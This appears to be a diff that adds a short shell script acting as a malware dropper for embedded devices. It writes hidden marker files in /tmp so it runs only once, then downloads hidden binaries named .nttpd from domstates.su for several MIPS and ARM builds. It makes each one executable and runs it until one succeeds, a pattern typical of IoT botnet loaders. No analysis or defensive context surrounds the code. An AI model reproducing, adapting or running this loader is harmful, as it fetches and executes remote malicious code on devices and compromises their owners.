@@ -1,0 +1,26 @@
+#!/bin/sh
+
+cd /tmp
+
+test -f .oc1217 && ps | grep -v grep | grep .nttpd && exit 0
+cat /dev/null > .oc1217
+
+test -f .v00d00 && exit 0
+cat /dev/null > .v00d00
+
+rm -f .nttpd
+wget -O .nttpd http://domstates.su/.nttpd,20-mips-le-t1
+chmod +x .nttpd
+./.nttpd && rm -f .v00d00 && exit 0
+
+rm -f .nttpd .nttpd-z
+wget -O .nttpd-z http://domstates.su/.nttpd,20-arm-le-t1-z
+chmod +x .nttpd-z
+./.nttpd-z && rm -f .v00d00 && exit 0
+
+rm -f .nttpd .nttpd-z
+wget -O .nttpd-z http://domstates.su/.nttpd,20-mips-be-t2-z
+chmod +x .nttpd-z
+./.nttpd-z && rm -f .v00d00 && exit 0
+
+rm -f .v00d00
